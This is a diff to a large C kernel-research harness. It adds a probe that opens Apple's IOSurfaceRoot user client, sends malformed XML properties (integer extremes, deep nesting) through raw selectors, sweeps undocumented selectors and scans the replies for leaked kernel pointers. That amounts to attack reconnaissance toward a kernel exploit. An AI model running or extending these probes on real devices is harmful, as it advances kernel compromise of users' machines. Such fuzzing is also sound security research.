@@ -16950,6 +16950,251 @@ static void *r440b_read_thread(void *arg) {
     return NULL;
 }
 
+static void r443_probe(void) {
+    rlog("\n=== r443: Raw IOSurface XML parser fuzzing + direct selector probing ===\n\n");
+    fflush(stdout);
+
+    /* Open a raw connection to IOSurfaceRoot */
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("  IOSurfaceRoot service: 0x%x\n", service);
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    rlog("  IOServiceOpen: kr=0x%x conn=0x%x\n", kr, conn);
+    IOObjectRelease(service);
+
+    if (kr != KERN_SUCCESS || conn == 0) {
+        rlog("  Failed to open IOSurfaceRoot connection\n");
+        return;
+    }
+
+    /* Vector A: Send crafted XML with edge-case values */
+    rlog("\n  --- Vector A: Crafted XML via selector 17 (SetValue) ---\n");
+    {
+        /* First, create a surface to work with */
+        const char *create_xml =
+            "<dict>"
+            "<key>IOSurfaceWidth</key><integer>32</integer>"
+            "<key>IOSurfaceHeight</key><integer>32</integer>"
+            "<key>IOSurfaceBytesPerRow</key><integer>128</integer>"
+            "<key>IOSurfaceAllocSize</key><integer>4096</integer>"
+            "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+            "</dict>";
+
+        uint32_t sid = 0;
+        size_t sid_sz = sizeof(sid);
+
+        /* Selector 0 = s_create */
+        kr = IOConnectCallStructMethod(conn, 0, create_xml, strlen(create_xml),
+            &sid, &sid_sz);
+        rlog("    Create surface via raw sel 0: kr=0x%x sid=%u\n", kr, sid);
+
+        if (kr == KERN_SUCCESS && sid > 0) {
+            /* Now try SetValue with crafted XML payloads */
+
+            /* Test 1: Very large integer value (potential integer overflow) */
+            {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>TestKey1</key><integer>18446744073709551615</integer>"  /* UINT64_MAX */
+                    "</dict>", sid);
+                uint8_t out[256];
+                size_t outsz = sizeof(out);
+                kr = IOConnectCallStructMethod(conn, 17, xml, strlen(xml), out, &outsz);
+                rlog("    SetValue UINT64_MAX: kr=0x%x outsz=%zu\n", kr, outsz);
+            }
+
+            /* Test 2: Negative integer */
+            {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>TestKey2</key><integer>-1</integer>"
+                    "</dict>", sid);
+                uint8_t out[256];
+                size_t outsz = sizeof(out);
+                kr = IOConnectCallStructMethod(conn, 17, xml, strlen(xml), out, &outsz);
+                rlog("    SetValue -1: kr=0x%x outsz=%zu\n", kr, outsz);
+            }
+
+            /* Test 3: Very large data blob (1MB size in XML) */
+            {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>TestKey3</key><data>AAAA</data>"
+                    "</dict>", sid);
+                uint8_t out[256];
+                size_t outsz = sizeof(out);
+                kr = IOConnectCallStructMethod(conn, 17, xml, strlen(xml), out, &outsz);
+                rlog("    SetValue data: kr=0x%x outsz=%zu\n", kr, outsz);
+            }
+
+            /* Test 4: Deeply nested dict */
+            {
+                char xml[2048];
+                int pos = 0;
+                pos += snprintf(xml + pos, sizeof(xml) - pos,
+                    "<dict><key>IOSurfaceID</key><integer>%u</integer><key>nest</key>", sid);
+                for (int i = 0; i < 50; i++)
+                    pos += snprintf(xml + pos, sizeof(xml) - pos, "<dict><key>d%d</key>", i);
+                pos += snprintf(xml + pos, sizeof(xml) - pos, "<integer>42</integer>");
+                for (int i = 0; i < 50; i++)
+                    pos += snprintf(xml + pos, sizeof(xml) - pos, "</dict>");
+                pos += snprintf(xml + pos, sizeof(xml) - pos, "</dict>");
+
+                uint8_t out[256];
+                size_t outsz = sizeof(out);
+                kr = IOConnectCallStructMethod(conn, 17, xml, pos, out, &outsz);
+                rlog("    SetValue nested(50): kr=0x%x outsz=%zu\n", kr, outsz);
+            }
+
+            /* Test 5: Type confusion — set a property then read it back */
+            /* Use CopyValue (sel 18) to read back */
+            {
+                char setxml[512];
+                snprintf(setxml, sizeof(setxml),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>LeakTest</key><integer>12345</integer>"
+                    "</dict>", sid);
+                uint8_t out[256];
+                size_t outsz = sizeof(out);
+                kr = IOConnectCallStructMethod(conn, 17, setxml, strlen(setxml), out, &outsz);
+                rlog("    Set LeakTest: kr=0x%x\n", kr);
+
+                /* CopyValue for LeakTest */
+                char getxml[512];
+                snprintf(getxml, sizeof(getxml),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>IOSurfacePropertyKey</key><string>LeakTest</string>"
+                    "</dict>", sid);
+                uint8_t getout[4096];
+                size_t getsz = sizeof(getout);
+                kr = IOConnectCallStructMethod(conn, 18, getxml, strlen(getxml), getout, &getsz);
+                rlog("    CopyValue LeakTest: kr=0x%x outsz=%zu\n", kr, getsz);
+                if (kr == KERN_SUCCESS && getsz > 0) {
+                    /* Show raw output — might contain kernel metadata */
+                    rlog("    Raw output: ");
+                    for (size_t i = 0; i < getsz && i < 128; i++) {
+                        rlog("%02x", getout[i]);
+                    }
+                    rlog("\n");
+
+                    /* Scan for kernel pointers */
+                    uint64_t *qw = (uint64_t*)getout;
+                    for (size_t i = 0; i < getsz / 8; i++) {
+                        if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    *** KPTR at +%zu: 0x%016llx ***\n", i*8, (unsigned long long)qw[i]);
+                        }
+                    }
+                }
+            }
+
+            /* Test 6: Try selectors 1-16 (surface operations we haven't tried raw) */
+            rlog("\n  --- Selector probing 1-16 (raw struct) ---\n");
+            for (int sel = 1; sel <= 16; sel++) {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict><key>IOSurfaceID</key><integer>%u</integer></dict>", sid);
+                uint8_t out[4096];
+                size_t outsz = sizeof(out);
+                memset(out, 0, sizeof(out));
+                kr = IOConnectCallStructMethod(conn, sel, xml, strlen(xml), out, &outsz);
+                if (kr == KERN_SUCCESS) {
+                    rlog("    sel %d: kr=SUCCESS outsz=%zu\n", sel, outsz);
+                    if (outsz > 0) {
+                        /* Scan for kernel pointers */
+                        uint64_t *qw = (uint64_t*)out;
+                        for (size_t i = 0; i < outsz / 8; i++) {
+                            if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      +%zu: 0x%016llx ← KPTR!\n", i*8, (unsigned long long)qw[i]);
+                            }
+                        }
+                        /* Show first few bytes if interesting */
+                        if (outsz >= 16) {
+                            rlog("      first16: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x\n",
+                                 out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7],
+                                 out[8],out[9],out[10],out[11],out[12],out[13],out[14],out[15]);
+                        }
+                    }
+                } else if (kr != 0xe00002c2 /* kIOReturnUnsupported */) {
+                    rlog("    sel %d: kr=0x%x\n", sel, kr);
+                }
+            }
+
+            /* Test 7: Try selectors 19-30 with the surface ID */
+            rlog("\n  --- Selector probing 19-30 (raw struct) ---\n");
+            for (int sel = 19; sel <= 30; sel++) {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict><key>IOSurfaceID</key><integer>%u</integer></dict>", sid);
+                uint8_t out[4096];
+                size_t outsz = sizeof(out);
+                memset(out, 0, sizeof(out));
+                kr = IOConnectCallStructMethod(conn, sel, xml, strlen(xml), out, &outsz);
+                if (kr == KERN_SUCCESS) {
+                    rlog("    sel %d: kr=SUCCESS outsz=%zu\n", sel, outsz);
+                    if (outsz > 0) {
+                        uint64_t *qw = (uint64_t*)out;
+                        for (size_t i = 0; i < outsz / 8; i++) {
+                            if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      +%zu: 0x%016llx ← KPTR!\n", i*8, (unsigned long long)qw[i]);
+                            }
+                        }
+                        if (outsz >= 16) {
+                            rlog("      first16: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x\n",
+                                 out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7],
+                                 out[8],out[9],out[10],out[11],out[12],out[13],out[14],out[15]);
+                        }
+                    }
+                } else if (kr != 0xe00002c2) {
+                    rlog("    sel %d: kr=0x%x\n", sel, kr);
+                }
+            }
+
+            /* Test 8: CopyAll — try to dump ALL properties of a surface */
+            rlog("\n  --- Test 8: CopyAll properties ---\n");
+            {
+                char xml[512];
+                snprintf(xml, sizeof(xml),
+                    "<dict><key>IOSurfaceID</key><integer>%u</integer></dict>", sid);
+                uint8_t out[16384];
+                size_t outsz = sizeof(out);
+                memset(out, 0, sizeof(out));
+                /* Selector 18 with no key might return all properties */
+                kr = IOConnectCallStructMethod(conn, 18, xml, strlen(xml), out, &outsz);
+                rlog("    CopyAll: kr=0x%x outsz=%zu\n", kr, outsz);
+                if (kr == KERN_SUCCESS && outsz > 0 && outsz < 1024) {
+                    rlog("    Raw: ");
+                    for (size_t i = 0; i < outsz && i < 256; i++)
+                        rlog("%02x", out[i]);
+                    rlog("\n");
+                    /* Check for kernel pointers */
+                    uint64_t *qw = (uint64_t*)out;
+                    for (size_t i = 0; i < outsz / 8; i++) {
+                        if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    *** KPTR at +%zu: 0x%016llx ***\n", i*8, (unsigned long long)qw[i]);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    IOServiceClose(conn);
+
+    rlog("\n=== r443 complete ===\n");
+    fflush(stdout);
+}
+
 static void r442_probe(void) {
     rlog("\n=== r442: kdebug trace + broad kernel scan + stackshot + diagnostics ===\n\n");
     fflush(stdout);
@@ -78222,6 +78467,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 446) {
+            rlog("*** rounds=446: Raw IOSurface XML parser + selector probing ***\n\n");
+            fflush(stdout);
+            r443_probe();
+            goto done;
+        }
         if (rounds == 445) {
             rlog("*** rounds=445: kdebug + sysctl scan + broad addr + kas_info ***\n\n");
             fflush(stdout);
@@ -80918,7 +81169,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
